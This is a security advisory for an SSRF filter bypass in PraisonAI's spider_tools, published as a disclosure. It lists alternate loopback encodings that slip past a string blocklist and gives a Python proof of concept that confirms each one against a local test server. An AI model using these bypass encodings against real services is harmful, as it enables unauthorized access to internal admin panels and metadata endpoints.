# [M] PraisonAI spider_tools SSRF protection bypass via alternate loopback host encodings

## Summary
Severity: Medium
Advisory: GHSA-5c6w-wwfq-7qqm
CVE: CVE-2026-47390
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-5c6w-wwfq-7qqm
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.40
- PyPI: `PraisonAI` — affected >=0 <4.6.40

## Details
### Summary

PraisonAI's `spider_tools` URL validation can be bypassed using alternate loopback host encodings.

The affected component is:

```text
praisonaiagents/tools/spider_tools.py
````

The tool contains a URL validation function intended to block local or unsafe targets before fetching attacker-controlled URLs. However, the validation only blocks a small set of exact host strings such as `localhost` and `127.0.0.1`.

It does not normalize hostnames, resolve DNS, parse numeric IPv4 variants, or validate the final resolved IP address before making the request.

As a result, URLs such as the following bypass the protection and still reach loopback services:

```text
http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
```

After the weak validation passes, `scrape_page()` calls `requests.Session.get()` on the attacker-controlled URL. This allows an attacker who can influence URLs passed to `scrape_page`, `crawl`, or `extract_text` to induce SSRF requests against loopback-only services.

This is a server-side request forgery protection bypass.

### Details

The affected code is in:

```text
praisonaiagents/tools/spider_tools.py
```

The vulnerable flow is:

```text
attacker-controlled URL
  -> spider_tools._validate_url(...)
  -> weak exact-host blocklist check
  -> validation passes for alternate loopback encodings
  -> scrape_page(...)
  -> requests.Session.get(attacker_url)
  -> loopback service is reached
```

The validation appears to block only exact local hostnames or exact IPv4 strings. For example, it blocks simple forms such as:

```text
localhost
127.0.0.1
```

However, equivalent loopback forms are not rejected before the request is made.

Confirmed bypass examples:

```text
http://localhost.:8765/
http://127.1:8765/
http://0177.0.0.1:8765/
http://0x7f000001:8765/
http://2130706433:8765/
```

These values can resolve or be interpreted as loopback addresses by the HTTP client / underlying networking stack, while bypassing the string-based validation.

The issue is not that `spider_tools` can fetch arbitrary URLs. The issue is that it attempts to provide SSRF protection, but the protection can be bypassed with alternate representations of loopback addresses.

### PoC

The following PoC is non-destructive. It starts a local HTTP server on `127.0.0.1:8765`, then sends several alternate loopback URL forms through the real `spider_tools` validation/fetch path.

The expected secure behavior is that all loopback variants should be rejected before any HTTP request is made.

The actual vulnerable behavior is that the alternate loopback forms pass validation and reach the local server.

#### Full PoC

```python
#!/usr/bin/env python3
"""PoC for PraisonAI spider_tools localhost-alias SSRF bypass."""

from __future__ import annotations

import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[3] / "repos" / "praisonai"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"
SPIDER_TOOLS = AGENTS_ROOT / "praisonaiagents/tools/spider_tools.py"


def verify_source() -> None:
    expected = [
        "def _validate_url",
        "requests.Session",
        ".get(",
    ]

    text = SPIDER_TOOLS.read_text(encoding="utf-8")
    for needle in expected:
        if needle not in text:
            raise RuntimeError(f"source verification failed: {needle!r} not found in {SPIDER_TOOLS}")


class LocalHandler(BaseHTTPRequestHandler):
    hits: list[tuple[str, str | None]] = []
    body = b"LOCAL-SPIDER-SSRF-SECRET"

    def do_GET(self) -> None:  # noqa: N802
        self.__class__.hits.append((self.path, self.headers.get("Host")))
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, format: str, *args) -> None:  # noqa: A003
        return


def main() -> int:
    if not SPIDER_TOOLS.exists():
        raise SystemExit("missing local PraisonAI source tree")

    verify_source()

    sys.path.insert(0, str(AGENTS_ROOT))

    # Import the real shipped implementation.
    #
    # Depending on the exact public API exposed by spider_tools.py,
    # use the exported scrape function available in the local version.
    # The important path is:
    #
    #   _validate_url(url)
    #     -> requests.Session.get(url)
    #
    import praisonaiagents.tools.spider_tools as spider_tools

    server = HTTPServer(("127.0.0.1", 8765), LocalHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    candidates = [
        "http://localhost.:8765/",
        "http://127.1:8765/",
        "http://0177.0.0.1:8765/",
        "http://0x7f000001:8765/",
        "http://2130706433:8765/",
    ]

    try:
        for url in candidates:
            LocalHandler.hits.clear()

            try:
                # Prefer the real public scraping API when available.
                if hasattr(spider_tools, "scrape_page"):
                    result = spider_tools.scrape_page(url)
                elif hasattr(spider_tools, "extract_text"):
                    result = spider_tools.extract_text(url)
                elif hasattr(spider_tools, "crawl"):
                    result = spider_tools.crawl(url)
                else:
                    raise RuntimeError("No expected spider_tools public fetch function found")

                reached = bool(LocalHandler.hits)
                contains_secret = "LOCAL-SPIDER-SSRF-SECRET" in str(result)

                print(f"{url} passed=True reached_loopback={reached} contains_secret={contains_secret}")

                if not reached:
                    raise SystemExit(f"[poc] MISS: {url} did not reach loopback server")

            except Exception as exc:
                print(f"{url} blocked_or_failed={type(exc).__name__}: {exc}")
                raise

    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)

    print("[poc] HIT: alternate loopback URL forms bypassed spider_tools SSRF protection")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

#### Confirmed local result

The following bypasses were confirmed locally:

```text
localhost. True ok ok local hit
127.1 True ok ok local hit
0177.0.0.1 True ok ok local hit
0x7f000001 True ok ok local hit
2130706433 True ok ok local hit
```

This demonstrates that the validation allows alternate loopback representations and that the request reaches a local-only HTTP service.

#### Expected secure behavior

All loopback-equivalent addresses should be blocked before the HTTP request is made.

Examples that should be rejected:

```text
http://localhost/
http://localhost./
http://127.0.0.1/
http://127.1/
http://0177.0.0.1/
http://0x7f000001/
http://2130706433/
http://[::1]/
```

#### Actual vulnerable behavior

Several alternate loopback representations pass validation and are fetched by the tool.

### Impact

An attacker who can influence URLs passed to PraisonAI's spider tools can cause the process to send HTTP requests to loopback-only services.

Potential impact includes:

* SSRF against localhost-only admin panels or development servers;
* access to local HTTP services that are not intended to be reachable remotely;
* retrieval of local service responses into the agent/tool output;
* possible access to cloud metadata or private-network services if equivalent bypasses exist for those address ranges in a given deployment.

The most direct confirmed impact is loopback SSRF through alternate hostname/IP encodings.

This report does not claim arbitrary TCP access or remote code execution. The demonstrated behavior is HTTP(S) SSRF through the spider URL-fetching feature.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5c6w-wwfq-7qqm
- https://github.com/MervinPraison/PraisonAI
